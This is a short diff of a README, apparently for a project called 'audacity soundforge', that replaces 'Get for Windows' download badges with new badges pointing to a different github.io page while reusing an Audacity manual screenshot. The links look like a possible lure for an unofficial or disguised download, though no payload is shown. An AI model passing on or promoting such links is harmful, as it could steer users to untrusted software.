@@ -5,11 +5,8 @@
 </div>  
 <br>
 
-<div align="center">
+[![GET audacity soundforge](https://img.shields.io/badge/GET%20%E2%80%94%20audacity-soundforge-0078D6?style=for-the-badge&logoColor=white)](https://powelseppersaud.github.io/.github/audacity-soundforge)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://audacity-soundforge-pro.github.io/.github/)
-
-</div>
 
 ---
 
@@ -26,11 +23,8 @@
   <img src="https://manual.audacityteam.org/m/images/4/49/front_page_3_7_3_78_numbered.png" width="800"/> 
 </div>
 
-<div align="center">
+[![GET audacity soundforge](https://img.shields.io/badge/GET%20%E2%80%94%20audacity-soundforge-0078D6?style=for-the-badge&logoColor=white)](https://powelseppersaud.github.io/.github/audacity-soundforge)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://audacity-soundforge-pro.github.io/.github/)
-
-</div>
 
 ---
 
